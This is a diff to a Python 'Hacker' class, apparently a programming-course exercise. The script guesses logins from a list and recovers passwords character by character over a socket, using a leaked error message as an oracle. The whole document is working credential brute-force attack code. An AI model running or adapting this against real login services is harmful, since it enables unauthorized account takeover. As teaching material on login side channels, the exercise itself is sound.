@@ -16,10 +16,11 @@ class Hacker(object):
 
     def main(self):
         self.client_socket.connect(self.address)
+
         keys = list(map(chr, range(97, 123)))
         keys.extend(list(map(chr, range(48, 58))))
         keys.extend(list(map(chr, range(65, 91))))
-        keys = itertools.chain(keys)
+        keys = itertools.cycle(keys)
 
         got_login = False
         got_password = False
@@ -29,27 +30,28 @@ class Hacker(object):
             while not got_password:
                 while not got_login:
                     admin = admins.readline().rstrip('\n')
-                    credentials = {"login": admin, "password": None}
-                    self.client_socket.send(json.dumps(credentials).encode(encoding='UTF-16'))
+                    credentials = {"login": admin, "password": ' '}
+                    self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                     response = self.client_socket.recv(1024)
-                    response = response.decode(encoding='UTF-16')
+                    response = response.decode(encoding='UTF8')
                     response = json.loads(response)
-                    print(response['result'])
+                    # print(response['result'])
                     if response['result'] == 'Wrong password!':
                         got_login = True
-
                 pass_trial = incomplete_pass + next(keys)
+                
                 credentials = {"login": admin, "password": pass_trial}
-                self.client_socket.send(json.dumps(credentials).encode(encoding='UTF-16'))
+                self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                 response = self.client_socket.recv(1024)
-                response = response.decode(encoding='UTF-16')
+                response = response.decode(encoding='UTF8')
                 response = json.loads(response)
 
                 if response['result'] == 'Exception happened during login':
                     incomplete_pass = pass_trial
-                    keys = itertools.chain(keys)
                 elif response['result'] == "Connection success!":
-                    return
+                    credentials = {"login": admin, "password": pass_trial}
+                    print(json.dumps(credentials))
+                    got_password = True
 
     def closing(self):
         self.client_socket.close()
